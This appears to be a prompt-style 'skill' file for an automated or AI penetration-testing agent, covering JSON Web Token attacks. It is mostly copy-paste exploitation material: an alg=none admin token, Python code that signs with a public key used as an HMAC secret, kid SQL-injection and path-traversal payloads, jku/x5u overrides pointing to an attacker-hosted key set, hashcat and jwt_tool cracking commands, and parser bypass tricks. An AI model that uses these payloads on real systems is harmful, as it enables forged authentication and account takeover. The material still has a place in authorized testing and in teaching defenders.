# SKILL: JWT Attacks (alg=none / weak HS / kid injection / jku / x5u / public→private)

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (jwt attacks (alg=none / weak hs / kid injection / jku / x5u / public→private)) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
JWT is everywhere; misimplementation is everywhere. I always test alg manipulation, kid traversal, weak secret, jku/x5u override.

---

## DETECTION
1. Decode token. Note `alg` and `kid`/`jku`/`x5u`.
2. Test `alg=none`: `{"alg":"none"}.{...}.` (empty signature).
3. Test HS256→HS512 / RS256→HS256 (signing with public key as HMAC key).
4. Test `kid` traversal: `{"kid":"../../../../dev/null"}` then sign with empty key.
5. Test `jku`/`x5u` override: point to attacker.tld JWKS.
6. Brute weak HS256 secrets with `jwt-cracker` or `hashcat -m 16500`.

## EXPLOITATION
### alg=none
```
header: {"alg":"none","typ":"JWT"}
payload: {"sub":"admin","iat":...,"exp":...}
signature: (empty)
final: <b64header>.<b64payload>.
```

### RS256 → HS256 (sign with public key as HMAC secret)
```python
import jwt
pub = open('jwks_public.pem').read()
token = jwt.encode({'sub':'admin'}, pub, algorithm='HS256')
```

### kid SQL injection
```
kid: 'UNION SELECT 'AAAA'-- 
# Sign payload with HMAC-SHA256(key='AAAA')
```

### kid path traversal
```
kid: ../../../dev/null
# Sign with empty key (or known constant if /dev/null served)
```

### jku override
```
jku: https://attacker.tld/jwks.json
# Host JWKS containing attacker's RSA public key matching attacker's private key
```

### x5u override
Same as jku but `x5u` (X.509 cert URL).

### Weak secret brute
```bash
jwt_tool token -C -d /path/to/wordlist.txt
hashcat -a 0 -m 16500 token.txt rockyou.txt
```

## PAYLOADS (real, copy-paste, grouped)
(see above)

## BYPASS TECHNIQUES
Mixing `alg=NONE` (caps), `alg=nOnE`, `alg=`, blank header. JSON duplicate keys: `{"alg":"HS256","alg":"none"}` — depending on parser.

## CHAIN POTENTIAL
JWT forgery → ATO any user / role escalate.

## TOOLS
jwt_tool, jwt-cracker, hashcat, jwt.io for manual

## COMMANDS
```bash
jwt_tool eyJhbGciOi... -T              # tamper interactive
jwt_tool eyJ... -X a                    # alg=none
jwt_tool eyJ... -X k -pk public.pem     # confused-key (RS→HS)
jwt_tool eyJ... -X i -I -pc name -pv admin   # kid sqli
jwt_tool eyJ... -X s -ju https://attacker.tld/jwks.json -pk priv.pem   # jku override
```

## EDGE CASES / NOT-A-BUG TRAPS
Modern libs (PyJWT, jose, jsonwebtoken) reject alg=none unless explicitly enabled. Older libs / custom decoders bite.

## TRIAGE ANGLE (per platform)
Show forged token granting admin access in API call.

## SEVERITY & CVSS
9.0+.

## REFERENCES
PortSwigger JWT • jwt_tool README • PayloadsAllTheThings/JSON Web Token
